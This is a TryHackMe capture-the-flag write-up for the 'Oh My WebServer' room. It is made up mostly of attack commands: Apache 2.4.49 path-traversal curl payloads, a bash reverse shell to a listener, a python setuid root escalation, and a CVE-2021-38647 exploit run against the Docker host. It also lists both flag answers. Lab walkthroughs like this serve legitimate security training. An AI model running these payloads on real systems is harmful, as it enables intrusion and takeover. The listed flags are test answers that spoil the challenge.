# <div align="center">[Oh My WebServer - TryHackMe writeup](https://tryhackme.com/r/room/ohmyweb)</div>

<div align="center">Can you root me?</div>

<div align="center"> <img width="200" height="200" alt="Oh My WebServer" src="https://github.com/user-attachments/assets/2f7ecf5b-ab91-4a12-bfd5-bcd55e359857"/> </div>

<div align="center"> <img alt="Difficulty: Medium" src="https://img.shields.io/badge/Difficulty-Medium-yellow" /> <img alt="OS: Linux" src="https://img.shields.io/badge/OS-Linux-blue" /> </div>

## Task 1. oh-My-Webserver

### What is the user flag?

* ```nmap -sSCV <IP>```
* ```searchsploit Apache 2.4.49```
* ```https://www.exploit-db.com/exploits/50383```
* ```curl -s --path-as-is -d "echo Content-Type: text/plain; echo; /etc/passwd" http://<IP>/cgibin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"```
* ```curl 'http://<IP>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' --data 'echo Content-Type:text/plain; echo; bash -i >& /dev/tcp/<IP>/4444 0>&1'```
* #### [Exploit](https://github.com/Esther7171/THM-Walkthroughs/blob/main/Room/Oh-My-WebServer/Exploit.sh)
* ```nc -lvnp 4444```
* ```ls -la```
* ```ifconfig```
* ```python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'’```
* ```cat /root/user.txt```
```
THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
```
### What is the root flag?
* ```curl http://<my_own_IP>/nmap -o /tmp/nmap```
* ```./nmap -sSCV -p- 172.17.0.1```
* ```https://github.com/AlteredSecurity/CVE-2021-38647```
* ```python3 CVE-2021-38647.py -t 172.17.0.1 -c 'whoami;pwd;id;hostname;uname -a;cat /root/root*'```
* #### [CVE-2021-38647](https://github.com/Esther7171/THM-Walkthroughs/blob/main/Room/Oh-My-WebServer/CVE-2021-38647.py)
```
THM{7f147ef1f36da9ae29529890a1b6011f}
```
### Done 🙂
